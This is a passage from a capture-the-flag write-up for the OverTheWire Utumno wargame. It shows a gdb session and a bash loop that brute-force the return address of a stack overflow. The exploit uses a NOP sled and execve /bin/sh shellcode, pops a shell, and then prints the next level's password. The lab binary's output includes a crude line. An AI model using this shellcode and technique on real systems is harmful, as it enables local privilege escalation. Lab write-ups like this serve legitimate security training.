0xffffd891:	0x31303d69	0x3a34333b	0x303d6e6c	0x36333b31
0xffffd8a1:	0x3d686d3a	0x703a3030	0x30343d69	0x3a33333b
0xffffd8b1:	0x303d6f73	0x35333b31	0x3d6f643a	0x333b3130
0xffffd8c1:	0x64623a35	0x3b30343d	0x303b3333	0x64633a31
0xffffd8d1:	0x3b30343d	0x303b3333	0x726f3a31	0x3b30343d
0xffffd8e1:	0x303b3133	0x696d3a31	0x3a30303d	0x333d7573
0xffffd8f1:	0x31343b37	0x3d67733a	0x343b3033	0x61633a33
0xffffd901:	0x3b30333d	0x743a3134	0x30333d77	0x3a32343b
0xffffd911:	0x333d776f	0x32343b34	0x3d74733a	0x343b3733
0xffffd921:	0x78653a34	0x3b31303d	0x2a3a3233	0x7261742e
0xffffd931:	0x3b31303d	0x2a3a3133	0x7a67742e	0x3b31303d
0xffffd941:	0x2a3a3133	0x6372612e	0x3b31303d	0x2a3a3133
0xffffd951:	0x6a72612e	0x3b31303d	0x2a3a3133	0x7a61742e
0xffffd961:	0x3b31303d	0x2a3a3133	0x61686c2e	0x3b31303d
0xffffd971:	0x2a3a3133	0x347a6c2e	0x3b31303d	0x2a3a3133
0xffffd981:	0x687a6c2e	0x3b31303d	0x2a3a3133	0x6d7a6c2e
0xffffd991:	0x31303d61	0x3a31333b	0x6c742e2a	0x31303d7a
0xffffd9a1:	0x3a31333b	0x78742e2a	0x31303d7a	0x3a31333b
0xffffd9b1:	0x7a742e2a	0x31303d6f	0x3a31333b	0x37742e2a
0xffffd9c1:	0x31303d7a	0x3a31333b	0x697a2e2a	0x31303d70
0xffffd9d1:	0x3a31333b	0x3d7a2e2a	0x333b3130	0x2e2a3a31
0xffffd9e1:	0x31303d5a	0x3a31333b	0x7a642e2a	0x3b31303d
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) run $(python -c "print 'AAAA' + '\x11\xd8\xff\xff' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno7 $(python -c "print 'AAAA' + '\x11\xd8\xff\xff' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xdd\xd7\xff\xff'")
lol ulrich && fuck hector
process 26815 is executing new program: /bin/dash
$
```

Now, to get the shell, I wrote a quick bash script to bruteforce a proper return address:

```bash
utumno7@utumno:/utumno$ while [ $i  -lt  255 ]
> do
>    x=`printf "%02X\n"  $i`
>    echo $x
>    ./utumno7 $(python -c "print 'AAAA' +'\x11\xd8\xff\xff' +  '\x90' * 111  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x$x\xd7\xff\xff'")
>    i=`expr $i + 1`
> done
00
-bash: warning: command substitution: ignored null byte in input
lol ulrich && fuck hector
Segmentation fault
01
lol ulrich && fuck hector
Segmentation fault
02
lol ulrich && fuck hector
Segmentation fault
03
lol ulrich && fuck hector

...[removed]...

lol ulrich && fuck hector
$ whoami
utumno8
$ cat /etc/utumno_pass/utumno8
jaeyeetiav
$
```

## Решение Utumno 08

**SSH :** *ssh utumno8@utumno.labs.overthewire.org -p 2227*<br/>
**Pass :** *jaeyeetiav*

Nothing to see here. We're done with the **Utumno** wargame.
